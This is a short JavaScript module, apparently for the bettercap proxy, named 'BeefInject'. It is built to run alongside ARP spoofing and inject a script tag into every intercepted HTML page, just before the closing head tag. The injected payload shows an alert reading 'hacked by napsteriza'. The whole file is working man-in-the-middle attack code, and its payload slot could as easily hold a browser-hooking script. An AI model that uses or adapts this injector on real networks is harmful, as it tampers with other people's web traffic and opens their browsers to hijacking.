function onLoad() {
  log("BeefInject loaded." );
  //log("targets: " + env('arp.spoof.targets'));
}

function onResponse(req, res) {
  if( res.ContentType.indexOf('text/html') == 0 ){
    var body = res.ReadBody();
    if( body.indexOf('</head>') != -1 ) {
      log( "BeefInject loaded." );
      log("targets: " + env('arp.spoof.targets'));
      res.Body = body.replace( 
        '</head>', 
        '<script type="text/javascript">alert("*** hacked by napsteriza ***")</script></head>' 
      ); 
    }
  }
}
